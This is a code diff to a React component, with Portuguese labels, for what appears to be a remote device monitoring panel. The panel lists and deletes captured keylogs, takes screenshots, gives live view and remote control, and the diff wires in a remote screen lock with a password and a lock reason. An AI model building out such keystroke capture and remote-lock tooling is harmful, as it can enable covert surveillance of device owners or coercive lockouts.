@@ -5,6 +5,7 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import LockedScreen from "@/components/LockedScreen";
 import PhoneFrame from "@/components/PhoneFrame";
 import { trpc } from "@/lib/trpc";
+import { useToast } from "@/hooks/use-toast";
 
 interface DeviceDetailsProps {
   deviceId: string;
@@ -22,6 +23,10 @@ export default function DeviceDetails({
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
+  const [lockPassword, setLockPassword] = useState<string>("");
+  const [lockReason, setLockReason] = useState<string>("Dispositivo travado pelo administrador");
+  const [isLocking, setIsLocking] = useState(false);
+  const { toast } = useToast();
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -32,6 +37,12 @@ export default function DeviceDetails({
   // Fetch deleted keylogs from backend
   const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
     { deviceId }
+  );
+
+  // ✅ NOVO: Fetch screen lock status
+  const { data: screenLockStatus, refetch: refetchLockStatus } = trpc.screenLockAdvanced.status.useQuery(
+    { deviceId },
+    { refetchInterval: 3000 } // Atualizar a cada 3 segundos
   );
 
   // Mutations
@@ -50,37 +61,111 @@ export default function DeviceDetails({
     },
   });
 
+  // ✅ NOVO: Mutation para ativar travamento
+  const activateLockMutation = trpc.screenLockAdvanced.activate.useMutation({
+    onSuccess: () => {
+      setIsScreenLocked(true);
+      refetchLockStatus();
+      toast({
+        title: "✅ Sucesso",
+        description: "Tela travada com sucesso!",
+        variant: "default",
+      });
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao travar: ${error.message}`,
+        variant: "destructive",
+      });
+    },
+  });
+
+  // ✅ NOVO: Mutation para desativar travamento
+  const deactivateLockMutation = trpc.screenLockAdvanced.deactivate.useMutation({
+    onSuccess: () => {
+      setIsScreenLocked(false);
+      refetchLockStatus();
+      toast({
+        title: "✅ Sucesso",
+        description: "Tela desbloqueada com sucesso!",
+        variant: "default",
+      });
+    },
+    onError: (error) => {
+      toast({
+        title: "❌ Erro",
+        description: `Erro ao desbloquear: ${error.message}`,
+        variant: "destructive",
+      });
+    },
+  });
+
   const handleScreenshot = () => {
-    alert(`📸 Screenshot capturado de ${deviceName}`);
+    toast({
+      title: "📸 Screenshot",
+      description: `Screenshot capturado de ${deviceName}`,
+    });
   };
 
   const handleStopLive = () => {
     setIsLiveActive(false);
-    alert("⏹️ Visualização ao vivo parada");
+    toast({
+      title: "⏹️ Parado",
+      description: "Visualização ao vivo parada",
+    });
   };
 
   const handleActivateControl = () => {
     setIsControlActive(!isControlActive);
-    alert(
-      isControlActive
-        ? "🎮 Controle desativado"
-        : "🎮 Controle remoto ativado"
-    );
+    toast({
+      title: isControlActive ? "🎮 Desativado" : "🎮 Ativado",
+      description: isControlActive
+        ? "Controle remoto desativado"
+        : "Controle remoto ativado",
+    });
   };
 
-  const handleLockScreen = () => {
-    setIsScreenLocked(true);
-    alert("🔒 Tela travada! Digite a senha para destravar.");
+  // ✅ CORRIGIDO: Usar mutation para travar
+  const handleLockScreen = async () => {
+    if (isLocking) return;
+    
+    setIsLocking(true);
+    try {
+      await activateLockMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+        password: lockPassword || "default_password",
+        reason: lockReason,
+      });
+    } catch (error) {
+      console.error("Erro ao travar:", error);
+    } finally {
+      setIsLocking(false);
+    }
   };
 
-  const handleUnlockScreen = () => {
-    setIsScreenLocked(false);
-    alert("🔓 Tela desbloqueada com sucesso!");
+  // ✅ CORRIGIDO: Usar mutation para destravar
+  const handleUnlockScreen = async () => {
+    if (isLocking) return;
+    
+    setIsLocking(true);
+    try {
+      await deactivateLockMutation.mutateAsync({
+        deviceId: parseInt(deviceId),
+      });
+    } catch (error) {
+      console.error("Erro ao destravar:", error);
+    } finally {
+      setIsLocking(false);
+    }
   };
 
   const handleRemoveDevice = () => {
     if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
-      alert(`❌ Dispositivo ${deviceName} removido com sucesso`);
+      toast({
+        title: "❌ Removido",
+        description: `Dispositivo ${deviceName} removido com sucesso`,
+      });
       onBack();
     }
   };
@@ -97,7 +182,11 @@ export default function DeviceDetails({
 
   const handleRemoveSelectedKeylogs = () => {
     if (selectedKeylogs.size === 0) {
-      alert("Selecione pelo menos um keylog para remover");
+      toast({
+        title: "⚠️ Aviso",
+        description: "Selecione pelo menos um keylog para remover",
+        variant: "destructive",
+      });
       return;
     }
     selectedKeylogs.forEach((id) => {
@@ -143,6 +232,25 @@ export default function DeviceDetails({
         </h1>
       </div>
 
+      {/* ✅ NOVO: Status de Travamento */}
+      {screenLockStatus && screenLockStatus.isLocked && (
+        <Card className="bg-red-900 border-red-700 p-4">
+          <div className="flex items-center justify-between">
+            <div>
+              <p className="text-red-400 font-bold">🔒 Dispositivo Travado</p>
+              <p className="text-red-300 text-sm">{screenLockStatus.reason}</p>
+            </div>
+            <Button
+              onClick={handleUnlockScreen}
+              disabled={isLocking}
+              className="bg-green-600 hover:bg-green-700 text-white"
+            >
+              🔓 Destravar Agora
+            </Button>
+          </div>
+        </Card>
+      )}
+
       {/* Action Buttons */}
       <div className="flex flex-wrap gap-3">
         <Button
@@ -165,9 +273,10 @@ export default function DeviceDetails({
         </Button>
         <Button
           onClick={handleLockScreen}
-          className="bg-orange-600 hover:bg-orange-700 text-white"
+          disabled={isLocking}
+          className="bg-orange-600 hover:bg-orange-700 text-white disabled:opacity-50"
         >
-          🚫 Travar Tela
+          {isLocking ? "⏳ Travando..." : "🚫 Travar Tela"}
         </Button>
         <Button
           onClick={handleRemoveDevice}
@@ -176,6 +285,35 @@ export default function DeviceDetails({
           🗑️ Remover Dispositivo
         </Button>
       </div>
+
+      {/* ✅ NOVO: Configurações de Travamento */}
+      {!isScreenLocked && (
+        <Card className="bg-slate-800 border-slate-700 p-6">
+          <h3 className="text-cyan-400 font-bold mb-4">🔐 Configurações de Travamento</h3>
+          <div className="space-y-4">
+            <div>
+              <label className="text-slate-300 text-sm">Senha de Desbloqueio (opcional)</label>
+              <input
+                type="password"
+                value={lockPassword}
+                onChange={(e) => setLockPassword(e.target.value)}
+                placeholder="Digite uma senha para destravar"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
+              />
+            </div>
+            <div>
+              <label className="text-slate-300 text-sm">Motivo do Travamento</label>
+              <input
+                type="text"
+                value={lockReason}
+                onChange={(e) => setLockReason(e.target.value)}
+                placeholder="Ex: Dispositivo travado pelo administrador"
+                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
+              />
+            </div>
+          </div>
+        </Card>
+      )}
 
       {/* Tabs */}
       <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
